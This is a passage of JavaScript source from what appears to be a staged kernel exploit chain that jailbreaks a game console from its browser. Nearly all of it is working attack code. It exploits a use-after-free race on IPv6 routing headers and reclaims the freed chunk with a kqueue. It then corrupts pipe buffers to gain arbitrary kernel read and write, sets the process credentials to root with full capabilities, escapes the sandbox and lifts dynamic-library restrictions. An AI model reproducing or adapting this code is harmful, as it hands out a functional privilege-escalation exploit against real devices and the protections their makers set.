                    crossing_at = attempt;
                    window.syncMark("CROSSING-CENSUS", "tagAbsent " + tagAbsent0 + " -> "
                        + tagAbsent1 + " at attempt " + attempt
                        + " (closes=" + S.free_fd_idx + ") - the freed chunk is being reused"
                        + " by foreign data, so cred A is gone. Budget "
                        + POST_CROSSING_BUDGET + " more attempts, then abort.");
                }

                // CROSSING DETECTION. find_twins can only succeed if the chunk was freed
                // TWICE, so any attempt that fails LATER than 'twins' proves the double
                // free landed and cred A is gone. From here on every free_one_fd() is a
                // crfree on a reclaimed chunk (see POST_CROSSING_BUDGET).
                if (crossing_at === 0 && S._fail !== 'twins' && S._fail !== '?') {
                    crossing_at = attempt;
                    window.syncMark("CROSSING",
                        "detected at attempt " + attempt + "/" + TRIPLEFREE_ATTEMPTS
                        + " (first failure past twins: " + S._fail + ")"
                        + " - cred A is freed; every further close is a crfree on the"
                        + " reclaimed chunk. Budget " + POST_CROSSING_BUDGET
                        + " more attempts, then abort rather than overshoot.");
                }
                if (crossing_at !== 0 && (attempt - crossing_at) >= POST_CROSSING_BUDGET) {
                    window.syncMark("RACE-FINAL", "mism=" + (S._mismatch||0)
                        + " foreign=" + (S._foreign||0) + " twins=" + tally.twins
                        + " reclaim=" + tally.reclaim + " t1=" + tally.t1
                        + " t2=" + tally.t2 + " socks=" + S.ipv6_count
                        + "  (ABORTED on the overshoot budget, not exhausted)");
                    window.syncMark("CENSUS-FINAL", census_str(S));
                    fail("stage0: crossing at attempt " + crossing_at + " but no triplet"
                        + " within " + POST_CROSSING_BUDGET + " more attempts"
                        + " [twins=" + tally.twins + " reclaim=" + tally.reclaim
                        + " t1=" + tally.t1 + " t2=" + tally.t2 + "]"
                        + " - aborting BEFORE the overshoot corrupts the heap."
                        + " The race machinery is fine; this is the reclaim/alias step"
                        + " losing, so retry rather than widening the budget.");
                }

                if (attempt % 8 === 0 || attempt === 1) {
                    window.syncMark("RACE-TALLY", "attempt=" + attempt + " mism=" + (S._mismatch||0) + " foreign=" + (S._foreign||0) + " last=" + S._fail
                        + " twins=" + tally.twins + " reclaim=" + tally.reclaim
                        + " t1=" + tally.t1 + " t2=" + tally.t2);
                    window.syncMark("CENSUS", census_str(S));
                }
                nanosleep_ms(10);
            }
            window.syncMark("RACE-FINAL", "mism=" + (S._mismatch||0) + " foreign=" + (S._foreign||0) + " twins=" + tally.twins + " reclaim=" + tally.reclaim
                + " t1=" + tally.t1 + " t2=" + tally.t2 + " socks=" + S.ipv6_count);
            window.syncMark("CENSUS-FINAL", census_str(S));
            // Verdict, stated so the NEXT action does not need another console run:
            //   untouched ~= examined  -> spray+read healthy, reclaim NEVER happened
            //                             => crossing not reached; raise C0_HINT
            //   tagAbsent > 0          -> freed chunk IS being reused by foreign data
            //                             => crossing reached; alias/timing is the fault
            //   optlen not all 8       -> rthdr length accounting wrong, tag never lands
            {
                const C = S._census;
                if (C && C.examined) {
                    const pct = (C.untouched * 100 / C.examined) | 0;
                    window.syncMark("CENSUS-VERDICT",
                        C.tagAbsent > 0
                            ? ("RECLAIM SEEN (tagAbsent=" + C.tagAbsent + ") - crossing WAS"
                               + " reached, the alias/timing is at fault, NOT the budget")
                            : ("NO RECLAIM (" + pct + "% untouched) - crossing never reached;"
                               + " raise C0_HINT above " + (S._c0hint || "?")));
                }
            }
            fail("stage0: race failed after " + TRIPLEFREE_ATTEMPTS + " attempts"
                + " [twins=" + tally.twins + " reclaim=" + tally.reclaim
                + " t1=" + tally.t1 + " t2=" + tally.t2 + "]");
        }

        function build_uio(buf, iov_ptr, td, is_read, kaddr, size) {
            write64(buf, iov_ptr);
            write64(buf + 8n, UIO_IOV_COUNT);
            write64(buf + 16n, 0xFFFFFFFFFFFFFFFFn);
            write64(buf + 24n, size);
            write32(buf + 32n, UIO_SYSSPACE);
            write32(buf + 36n, is_read ? 1n : 0n);
            write64(buf + 40n, td);
            write64(buf + 48n, kaddr);
            write64(buf + 56n, size);
        }

        function signal_uio(S, mode) {
            S.active_uio_mode = mode;
            (mode === 0 ? S.uio_read_ws : S.uio_write_ws).signal();
        }
        function wait_uio(S) {
            (S.active_uio_mode === 0 ? S.uio_read_ws : S.uio_write_ws).wait();
        }

        function kread_slow(S, kaddr, size) {
            if (!triplets_valid(S)) return null;
            for (let i = 0; i < 64; i += 8) write64(S.uio_read_buf + BigInt(i), 0x4141414141414141n);
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                for (let j = 0; j < size; j++) write8(S.kread_result_bufs[i] + BigInt(j), 0n);
            }
            write32(S.kread_sndbuf, BigInt(size));
            syscall(SYSCALL.setsockopt, BigInt(S.uio_sock_b), SOL_SOCKET, SO_SNDBUF,
                S.kread_sndbuf, 4n);
            syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
            write64(S.uio_iov_read + 8n, BigInt(size));

            if (!triplets_valid(S)) return null;
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(3);

            let leaked_iov = 0n;
            let found = false;
            for (let it = 0; it < 2000; it++) {
                signal_uio(S, 0);
                syscall(SYSCALL.sched_yield);
                write32(S.len_out, 16n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 8n) === UIO_IOV_COUNT) { found = true; break; }
                syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
                for (let i = 0; i < UIO_THREAD_NUM; i++) {
                    syscall(SYSCALL.read, BigInt(S.uio_sock_a),
                        S.kread_result_bufs[i], BigInt(size));
                }
                wait_uio(S);
                syscall(SYSCALL.write, BigInt(S.uio_sock_b), S.scratch_big, BigInt(size));
            }
            if (!found) return null;
            leaked_iov = read64(S.rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return null;

            build_uio(S.recvmsg_iovecs, leaked_iov, 0n, true, kaddr, BigInt(size));

            if (!triplets_valid(S)) return null;
            rthdr_free_idx(S, S.triplets[2]);
            sched_yield_n(3);

            found = false;
            for (let it = 0; it < 2000; it++) {
                S.iov_ws.signal();
                sched_yield_n(5);
                write32(S.len_out, 64n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 32n) === UIO_SYSSPACE) { found = true; break; }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, IOV_GATE);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.scratch_big, IOV_GATE);
            }
            if (!found) return null;

            syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.scratch_big, BigInt(size));
            let result = null;
            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                syscall(SYSCALL.read, BigInt(S.uio_sock_a), S.kread_result_bufs[i], BigInt(size));
                const v = read64(S.kread_result_bufs[i]);
                if (v !== 0x4141414141414141n) {
                    const t = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST);
                    if (t === -1) {
                        wait_uio(S);
                        syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, IOV_GATE);
                        S.iov_ws.wait();
                        syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.scratch_big, IOV_GATE);
                        S.triplets[1] = find_triplet(S, S.triplets[0], S.triplets[2], FIND_TRIPLET_FAST);
                        return null;
                    }
                    S.triplets[1] = t;
                    result = S.kread_result_bufs[i];
                }
            }
            wait_uio(S);
            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, IOV_GATE);
            if (result === null) {
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.scratch_big, IOV_GATE);
                return null;
            }

            for (let k = 0; k < 5; k++) {
                S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                if (S.triplets[2] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[2] === -1) {
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.scratch_big, IOV_GATE);
                return null;
            }
            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.scratch_big, IOV_GATE);
            return result;
        }

        function kwrite_slow(S, kaddr, data_addr, data_size) {
            if (!triplets_valid(S)) return false;
            write32(S.kwrite_sndbuf, BigInt(data_size));
            syscall(SYSCALL.setsockopt, BigInt(S.uio_sock_b), SOL_SOCKET, SO_SNDBUF,
                S.kwrite_sndbuf, 4n);
            write64(S.uio_iov_write + 8n, BigInt(data_size));

            if (!triplets_valid(S)) return false;
            rthdr_free_idx(S, S.triplets[1]);
            sched_yield_n(3);

            let leaked_iov = 0n; let found = false;
            for (let it = 0; it < 2000; it++) {
                signal_uio(S, 1);
                syscall(SYSCALL.sched_yield);
                write32(S.len_out, 16n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 8n) === UIO_IOV_COUNT) { found = true; break; }
                for (let i = 0; i < UIO_THREAD_NUM; i++) {
                    syscall(SYSCALL.write, BigInt(S.uio_sock_b), data_addr, BigInt(data_size));
                }
                wait_uio(S);
            }
            if (!found) return false;
            leaked_iov = read64(S.rthdr_readback);
            if (leaked_iov === 0n || (leaked_iov >> 48n) !== 0xFFFFn) return false;

            build_uio(S.recvmsg_iovecs, leaked_iov, 0n, false, kaddr, BigInt(data_size));
            if (!triplets_valid(S)) return false;
            rthdr_free_idx(S, S.triplets[2]);
            sched_yield_n(3);

            found = false;
            for (let it = 0; it < 2000; it++) {
                S.iov_ws.signal();
                sched_yield_n(5);
                write32(S.len_out, 64n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 32n) === UIO_SYSSPACE) { found = true; break; }
                syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, IOV_GATE);
                S.iov_ws.wait();
                syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.scratch_big, IOV_GATE);
            }
            if (!found) return false;

            for (let i = 0; i < UIO_THREAD_NUM; i++) {
                syscall(SYSCALL.write, BigInt(S.uio_sock_b), data_addr, BigInt(data_size));
            }

            for (let k = 0; k < 5; k++) {
                S.triplets[1] = find_triplet(S, S.triplets[0], -1, FIND_TRIPLET_FAST);
                if (S.triplets[1] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[1] === -1) return false;

            wait_uio(S);
            syscall(SYSCALL.write, BigInt(S.iov_sock_b), S.scratch_big, IOV_GATE);

            for (let k = 0; k < 5; k++) {
                S.triplets[2] = find_triplet(S, S.triplets[0], S.triplets[1], FIND_TRIPLET_FAST);
                if (S.triplets[2] !== -1) break;
                syscall(SYSCALL.sched_yield);
            }
            if (S.triplets[2] === -1) return false;

            S.iov_ws.wait();
            syscall(SYSCALL.read, BigInt(S.iov_sock_a), S.scratch_big, IOV_GATE);
            return true;
        }

        function kslow64(S, kaddr) {
            for (let attempt = 0; attempt < 3; attempt++) {
                if (triplets_valid(S)) {
                    const buf = kread_slow(S, kaddr, 8);
                    if (buf !== null) {
                        const val = read64(buf);
                        if (val !== 0n) {
                            if ((val >> 48n) === 0xFFFFn) return val;
                            if ((val >> 40n) !== 0n) return val;
                        }
                    }
                }
                repair_triplets(S); syscall(SYSCALL.sched_yield);
            }
            return null;
        }

        async function stage1(S) {
            send_notification("Stage 1\nKqueue reclaim");
            // Remember WHICH socket we are about to poison. After this free, a kqueue is
            // deliberately made to land in that chunk, so this socket's ip6po_rthdr points
            // at a live kqueue for the rest of the run. Anything that sets an IPv6 option
            // on it calls free(kqueue, M_IP6OPT) - kernel 0xFFFFFFFF808D9618.
            S._poisoned = S.triplets[1];
            // Mirrored to a global so the top-level handler can see it: that handler has
            // no `S`, and from stage1 onward a close() of this socket frees a LIVE kqueue.
            window.__p2jbPoisoned = S._poisoned;
            window.syncMark("STAGE1", "poisoning socket " + S._poisoned
                + " (its rthdr chunk will hold the kqueue) - excluded from all future sprays");
            rthdr_free_idx(S, S.triplets[1]);

            let kq = 0n; let proc_filedesc = 0n;
            // BOUNDED + BEACONED. This was `while (true)` with no cap, no timeout and no
            // output: it spins kqueue()/getsockopt()/close() until a fresh kqueue lands in
            // the freed rthdr chunk. If that never happens the log goes SILENT FOREVER,
            // which is indistinguishable from a WebProcess freeze - we would misdiagnose a
            // stage1 miss as a crash. Report progress and give up with a clear reason.
            const KQ_RECLAIM_MAX = 200000;
            let kqTries = 0;
            window.syncMark("STAGE1", "kqueue reclaim: spinning for the freed chunk"
                + " (magic 0x1430000 at +8), max " + KQ_RECLAIM_MAX);
            while (true) {
                kq = syscall(SYSCALL.kqueue);
                write32(S.len_out, 256n);
                syscall(SYSCALL.getsockopt, BigInt(S.ipv6_sockets[S.triplets[0]]),
                    IPPROTO_IPV6, IPV6_RTHDR, S.rthdr_readback, S.len_out);
                if (read32(S.rthdr_readback + 8n) === 0x1430000n) {
                    proc_filedesc = read64(S.rthdr_readback + S.OFF.KQ_FDP);
                    window.syncMark("STAGE1", "kqueue LANDED after " + kqTries + " tries");
                    break;
                }
                syscall(SYSCALL.close, kq);
                if (++kqTries >= KQ_RECLAIM_MAX) {
                    window.syncMark("STAGE1", "kqueue reclaim FAILED after " + kqTries
                        + " tries - the kqueue never landed in the freed chunk");
                    fail("stage1: kqueue reclaim exhausted after " + kqTries + " tries");
                }
                if ((kqTries % 20000) === 0)
                    window.syncMark("STAGE1", "kqueue reclaim still spinning, " + kqTries
                        + "/" + KQ_RECLAIM_MAX);
            }
            syscall(SYSCALL.close, kq);
            S.proc_filedesc = proc_filedesc;
            await ulog("stage1: proc_filedesc=" + toHex(proc_filedesc));

            // The socket we freed at the top of stage1 (old triplets[1]) still points its
            // ip6po_rthdr at the chunk the kqueue now occupies. Spraying it would
            // free(kqueue, M_IP6OPT) - see the RE note on find_triplet. Skip it, and never
            // accept it as the repaired index either.
            const poisoned = S.triplets[1];
            const repaired = find_triplet(S, S.triplets[0], S.triplets[2], 50000, poisoned);
            if (repaired === -1) fail("stage1: triplet repair failed");
            if (repaired === poisoned)
                fail("stage1: triplet repair returned the poisoned socket " + poisoned);
            S.triplets[1] = repaired;
            window.syncMark("STAGE1", "triplet repaired: " + poisoned + " -> " + repaired
                + " (old one left un-sprayed, its rthdr aliases the kqueue)");
        }

        async function stage2(S) {
            send_notification("Stage 2\nLeak pipe data pointers");
            await ulog("stage2: leaking pipe pointers...");

            repair_triplets(S); nanosleep_ms(100);
            const fdescenttbl = kslow64(S, S.proc_filedesc + S.OFF.FILEDESC_OFILES);
            if (!fdescenttbl) fail("stage2: fdescenttbl read failed");
            S.fd_ofiles = fdescenttbl + S.OFF.FDESCENTTBL_HDR;
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            const master_fp = kslow64(S, S.fd_ofiles + BigInt(S.master_rfd) * S.OFF.FILEDESCENT_SIZE);
            if (!master_fp) fail("stage2: master_fp read failed");
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            const victim_fp = kslow64(S, S.fd_ofiles + BigInt(S.victim_rfd) * S.OFF.FILEDESCENT_SIZE);
            if (!victim_fp) fail("stage2: victim_fp read failed");
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            S.master_pipe_data = kslow64(S, master_fp);
            if (!S.master_pipe_data) fail("stage2: master_pipe_data read failed");
            repair_triplets(S); nanosleep_ms(500); repair_triplets(S);

            S.victim_pipe_data = kslow64(S, victim_fp);
            if (!S.victim_pipe_data) fail("stage2: victim_pipe_data read failed");

            if (S.master_pipe_data === S.victim_pipe_data)
                fail("stage2: master_pipe == victim_pipe (aliased - bad leak)");

            await ulog("stage2: master_pipe=" + toHex(S.master_pipe_data) +
                " victim_pipe=" + toHex(S.victim_pipe_data));
        }

        async function stage3(S) {
            send_notification("Stage 3\nPipe corruption -> fast kernel R/W");
            await ulog("stage3: corrupting pipe buffer...");

            const pipe_overwrite = malloc(24);
            write32(pipe_overwrite, 0n);
            write32(pipe_overwrite + 4n, 0n);
            write32(pipe_overwrite + 8n, 0n);
            write32(pipe_overwrite + 12n, BigInt(PAGE_SIZE));
            write64(pipe_overwrite + 16n, S.victim_pipe_data);

            nanosleep_ms(100);

            let ok = false;
            for (let attempt = 0; attempt < 40; attempt++) {
                repair_triplets(S);
                if (kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24)) { ok = true; break; }
                nanosleep_ms(100); syscall(SYSCALL.sched_yield);
            }
            if (!ok) fail("stage3: kwrite_slow failed after 40 attempts");
            syscall(SYSCALL.sched_yield);

            const pipe_cmd = malloc(24);
            const set_victim_pipe = (cnt, inp, out, size, buf_addr) => {
                write32(pipe_cmd, BigInt(cnt));
                write32(pipe_cmd + 4n, BigInt(inp));
                write32(pipe_cmd + 8n, BigInt(out));
                write32(pipe_cmd + 12n, BigInt(size));
                write64(pipe_cmd + 16n, buf_addr);
                syscall(SYSCALL.write, BigInt(S.master_wfd), pipe_cmd, 24n);
                syscall(SYSCALL.read, BigInt(S.master_rfd), pipe_cmd, 24n);
            };

            S.kread = (buf_addr, kaddr, size) => {
                set_victim_pipe(size, 0, 0, PAGE_SIZE, kaddr);
                return syscall(SYSCALL.read, BigInt(S.victim_rfd), buf_addr, BigInt(size));
            };
            S.kwrite = (kaddr, buf_addr, size) => {
                set_victim_pipe(0, 0, 0, PAGE_SIZE, kaddr);
                return syscall(SYSCALL.write, BigInt(S.victim_wfd), buf_addr, BigInt(size));
            };

            for (let i = 0n; i < 64n; i += 8n) write64(S.scratch_big + i, 0n);

            S.kread32 = (k) => { S.kread(S.scratch_big, k, 4); return read32(S.scratch_big); };
            S.kread64 = (k) => { S.kread(S.scratch_big, k, 8); return read64(S.scratch_big); };
            S.kwrite32 = (k, v) => { write32(S.scratch_big, BigInt(v)); S.kwrite(k, S.scratch_big, 4); };
            S.kwrite64 = (k, v) => { write64(S.scratch_big, BigInt(v)); S.kwrite(k, S.scratch_big, 8); };

            let verified = false;
            for (let attempt = 0; attempt < 3; attempt++) {
                if (S.kread64(S.master_pipe_data + 0x10n) === S.victim_pipe_data) {
                    verified = true; break;
                }
                nanosleep_ms(100); repair_triplets(S);
                kwrite_slow(S, S.master_pipe_data, pipe_overwrite, 24);
            }
            if (!verified) fail("stage3: verify failed");
            await ulog("stage3: kernel r/w achieved");

            await stage3_cleanup(S);
        }

        async function stage3_cleanup(S) {
            const get_fp = fd => S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
            const bump = (fp, delta) => {
                const rc = S.kread32(fp + 0x28n);
                if (rc > 0n && rc < 0x10000n) S.kwrite32(fp + 0x28n, Number(rc) + delta);
            };
            const null_rthdr = fd => {
                const fp = S.kread64(S.fd_ofiles + BigInt(fd) * S.OFF.FILEDESCENT_SIZE);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) return;
                const f_data = S.kread64(fp);
                if (f_data === 0n || (f_data >> 48n) !== 0xFFFFn) return;
                const so_pcb = S.kread64(f_data + 0x18n);
                if (so_pcb === 0n || (so_pcb >> 48n) !== 0xFFFFn) return;
                const pktopts = S.kread64(so_pcb + S.OFF.INPCB_PKTOPTS);
                if (pktopts === 0n || (pktopts >> 48n) !== 0xFFFFn) return;
                S.kwrite64(pktopts + S.OFF.IP6PO_RTHDR, 0n);
            };

            for (const fd of [S.master_rfd, S.master_wfd, S.victim_rfd, S.victim_wfd]) {
                const fp = get_fp(fd);
                if (fp === 0n || (fp >> 48n) !== 0xFFFFn) fail("stage3b: bad fp " + fd);
                bump(fp, 0x100);
            }

            if (S.free_fd_idx < S.free_fds.length) {
                const sample_fd = S.free_fds[S.free_fd_idx];
                const sample_fp = S.kread64(S.fd_ofiles + BigInt(sample_fd) * S.OFF.FILEDESCENT_SIZE);
                if (sample_fp !== 0n && (sample_fp >> 48n) === 0xFFFFn) {
                    const fcred = S.kread64(sample_fp + 0x10n);
                    if (fcred !== 0n && (fcred >> 48n) === 0xFFFFn) {
                        S.ucred_A = fcred;
                    }
                }
            }

            for (const fd of S.ipv6_sockets) null_rthdr(fd);

            // PIN cred A BEFORE the pool is closed. Every fd left in free_fds still holds
            // f_cred = A, and crfree opens with `lock xadd [rdi],-1` BEFORE the `cmp eax,1`
            // (see the header note), so the close loop below fires one UNCONDITIONAL
            // decrement per fd - 316 of them on the run that panicked - onto whatever now
            // occupies A's chunk. Drive that word to zero and crfree takes its
            // last-reference path, handing the occupant's +0x28/+0x30 to uifree() and
            // prison_free(): "Fatal trap 12: page fault while in kernel mode", milliseconds
            // later, asynchronously (run rmswgl86e died this way while parked in
            // pthread_join, with the console write cut mid-line).
            //
            // The "post-jb pin" already does exactly this, but it lives ~1600 lines further
            // on and does not run until several stages later - long after this loop has
            // already spent every decrement. Ordering was the whole bug; a cr_ref that no
            // number of closes can walk to zero makes each one take the early-out instead.
            // Safe here specifically because null_rthdr() above has already cleared
            // ip6po_rthdr, so nothing parses A as a routing header any more and closing the
            // sockets will not free it.
            if (S.ucred_A && (S.ucred_A >> 48n) === 0xFFFFn) {
                const PIN_EARLY = 0x10000000;
                const old = S.kread32(S.ucred_A) & 0xFFFFFFFFn;
                S.kwrite32(S.ucred_A, PIN_EARLY);
                const now = S.kread32(S.ucred_A) & 0xFFFFFFFFn;
                window.syncMark("PIN-EARLY", "A=" + toHex(S.ucred_A)
                    + " cr_ref " + toHex(old) + " -> " + toHex(now)
                    + " before " + (S.free_fds.length - S.free_fd_idx) + " pool closes"
                    + (Number(now) === PIN_EARLY ? "" : "  *** VERIFY FAILED ***"));
            } else {
                window.syncMark("PIN-EARLY", "A unknown/invalid (" + toHex(S.ucred_A || 0n)
                    + ") - pool closes will run UNPINNED, close-KP possible");
            }

            for (let i = S.free_fd_idx; i < S.free_fds.length; i++) {
                syscall(SYSCALL.close, BigInt(S.free_fds[i]));
            }

            for (const fd of S.ipv6_sockets) syscall(SYSCALL.close, BigInt(fd));

            syscall(SYSCALL.close, BigInt(S.iov_sock_a));
            syscall(SYSCALL.close, BigInt(S.iov_sock_b));
            syscall(SYSCALL.close, BigInt(S.uio_sock_a));
            syscall(SYSCALL.close, BigInt(S.uio_sock_b));

            S.iov_ws.signal();
            S.uio_read_ws.signal();
            S.uio_write_ws.signal();
            syscall(SYSCALL.sched_yield);
            syscall(SYSCALL.sched_yield);
            await ulog("stage3b: workers signalled (D5, left parked)");

            {
                const [sr, sw] = create_pipe();
                const sigio_rfd = Number(sr), sigio_wfd = Number(sw);
                const our_pid = syscall(SYSCALL.getpid) & 0xFFFFFFFFn;
                const pid_buf = malloc(4);
                write32(pid_buf, our_pid);
                syscall(SYSCALL.ioctl, BigInt(sigio_rfd), 0x8004667Cn, pid_buf);

                const sigio_fp = S.kread64(S.fd_ofiles +
                    BigInt(sigio_rfd) * S.OFF.FILEDESCENT_SIZE);

                if (sigio_fp === 0n || (sigio_fp >> 48n) !== 0xFFFFn)
                    fail("stage3b: bad sigio fp");

                const sigio_pipe = S.kread64(sigio_fp);

                if (sigio_pipe === 0n || (sigio_pipe >> 48n) !== 0xFFFFn)
                    fail("stage3b: bad sigio pipe");

                const pipe_sigio = S.kread64(sigio_pipe + S.OFF.PIPE_SIGIO);

                if (pipe_sigio === 0n || (pipe_sigio >> 48n) !== 0xFFFFn)
                    fail("stage3b: no sigio");

                const curproc = S.kread64(pipe_sigio);

                if (curproc === 0n || (curproc >> 48n) !== 0xFFFFn)
                    fail("stage3b: bad curproc");

                if (S.kread32(curproc + S.OFF.PROC_PID) !== our_pid)
                    fail("stage3b: pid mismatch");

                syscall(SYSCALL.close, BigInt(sigio_rfd));
                syscall(SYSCALL.close, BigInt(sigio_wfd));

                S.curproc = curproc;
                S.proc_ucred = S.kread64(curproc + S.OFF.PROC_UCRED);
                S.proc_fd = S.kread64(curproc + S.OFF.PROC_FD);
                await ulog("stage3b: curproc=" + toHex(curproc) +
                    " fd=" + toHex(S.proc_fd));
            }

            await ulog("stage3b: race cleanup done");

            await js_sleep(3000);
        }

        async function stage4(S) {
            send_notification("Stage 4\nFind rootvnode");

            if (!S.curproc || !S.proc_ucred || !S.proc_fd)
                fail("stage4: curproc/proc_ucred/proc_fd missing (should have " +
                    "been set in stage3_cleanup)");
            const curproc = S.curproc;
            await ulog("stage4: using curproc=" + toHex(curproc) +
                " from stage3_cleanup");

            let p = curproc, kernel_proc = null;
            for (let i = 0; i < 1000; i++) {
                if (p === 0n) break;
                if ((p >> 48n) !== 0xFFFFn) break;
                if (S.kread32(p + S.OFF.PROC_PID) === 0n) { kernel_proc = p; break; }
                p = S.kread64(p + 0n);
            }
            if (!kernel_proc) fail("stage4: kernel proc (pid=0) not found");

            const kernel_fd = S.kread64(kernel_proc + S.OFF.PROC_FD);
            if (kernel_fd === 0n || (kernel_fd >> 48n) !== 0xFFFFn)
                fail("stage4: kernel_fd bad: " + toHex(kernel_fd));

            const rootvnode = S.kread64(kernel_fd + S.OFF.FD_CDIR);
            if (rootvnode === 0n || (rootvnode >> 48n) !== 0xFFFFn)
                fail("stage4: rootvnode bad: " + toHex(rootvnode));

            S.rootvnode = rootvnode;
            await ulog("stage4: kernel_proc=" + toHex(kernel_proc) +
                " rootvnode=" + toHex(rootvnode));
        }

        async function stage5(S) {
            send_notification("Stage 5\nJailbreak");

            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_UID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RUID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_SVUID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_NGROUPS, 1);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_RGID, 0);
            S.kwrite32(S.proc_ucred + S.OFF.UCRED_CR_SVGID, 0);

            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCEAUTHID, SYSTEM_AUTHID);
            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS0, 0xFFFFFFFFFFFFFFFFn);
            S.kwrite64(S.proc_ucred + S.OFF.UCRED_CR_SCECAPS1, 0xFFFFFFFFFFFFFFFFn);

            let attrs = S.kread64(S.proc_ucred + 0x80n);
            attrs = (attrs & 0xFFFFFFFF00FFFFFFn) | (0x80n << 24n);
            S.kwrite64(S.proc_ucred + 0x80n, attrs);

            S.kwrite64(S.proc_fd + S.OFF.FD_RDIR, S.rootvnode);
            S.kwrite64(S.proc_fd + S.OFF.FD_JDIR, S.rootvnode);

            if (S.kread32(S.proc_ucred + S.OFF.UCRED_CR_UID) !== 0n) {
                fail("stage5: jailbreak verify failed");
            }
            await ulog("stage5: jailbreak ok");
        }

        async function stage6(S) {
            send_notification("Stage 6\nResolve kernel data_base");

            const KDATA_MASK = 0xffff804000000000n;
            let p = S.curproc, allproc = 0n;
            for (let i = 0; i < 64; i++) {
                if (p !== 0n && (p & KDATA_MASK) === KDATA_MASK &&
                    ((p - S.OFF.DATA_BASE_ALLPROC) & 0xfffn) === 0n) {
                    allproc = p; break;
                }
                p = S.kread64(p + 8n);
            }
            if (allproc === 0n) {
                S.data_base_ok = false;
                await ulog("stage6: allproc not found - elf loader skipped " +
                    "(jailbreak is done)");
                return;
            }
            const data_base = allproc - S.OFF.DATA_BASE_ALLPROC;
            S.data_base = data_base;
            await ulog("stage6: allproc=" + toHex(allproc) +
                " data_base=" + toHex(data_base));

            let data_base_ok = true;
            const first_proc = S.kread64(allproc);
            const first_proc_ok = (first_proc >> 48n) === 0xFFFFn;
            await ulog("stage6: data_base check - *allproc=" + toHex(first_proc) +
                (first_proc_ok ? "  (kptr OK)" : "  (BAD - not a kptr)"));
            if (!first_proc_ok) data_base_ok = false;

            if (typeof is_jailbroken === "function")
                await ulog("stage6: is_jailbroken() = " + is_jailbroken());
            S.data_base_ok = data_base_ok;
            if (!data_base_ok) {
                await ulog("stage6: data_base check FAILED - skipping the elf " +
                    "loader. The jailbreak is complete.");
                return;
            }
        }

        async function stage7(S) {
            send_notification("Stage 7\nFinalize: dynlib restrictions");

            const is_kptr = (v) =>
                (v & 0xFFFF000000000000n) === 0xFFFF000000000000n;

            const p_dynlib = S.kread64(S.curproc + 0x3E8n);

            if (!is_kptr(p_dynlib))
                throw new Error("p_dynlib not a kptr: " + toHex(p_dynlib));

            S.kwrite32(p_dynlib + 0x118n, 0);
            S.kwrite64(p_dynlib + 0x18n, 1n);

            S.kwrite64(p_dynlib + 0xF0n, 0n);
            S.kwrite64(p_dynlib + 0xF8n, 0xFFFFFFFFFFFFFFFFn);

            const dynlib_eboot = S.kread64(p_dynlib + 0x00n);

            if (!is_kptr(dynlib_eboot))
                throw new Error("dynlib_eboot not a kptr: " + toHex(dynlib_eboot));

            const eboot_segments = S.kread64(dynlib_eboot + 0x40n);

            if (!is_kptr(eboot_segments))
                throw new Error("eboot_segments not a kptr: " + toHex(eboot_segments));

            S.kwrite64(eboot_segments + 0x08n, 0n);
            S.kwrite64(eboot_segments + 0x10n, 0xFFFFFFFFFFFFFFFFn);
            await ulog("stage7: dynlib patched " +
                "(syscalls + dlsym unrestricted, dynlib=" +
                toHex(p_dynlib) + ")");

            await ulog("stage7: dynlib maximized; jailbreak fully finalized");
            send_notification(p2jb_version + "\nFW=" + FW_VERSION + "\nJailbroken");

            await ulog("stage7: 'Jailbroken' notification sent -> stage_load_elf");

        }

        const CPU_PDE_SHIFT = {
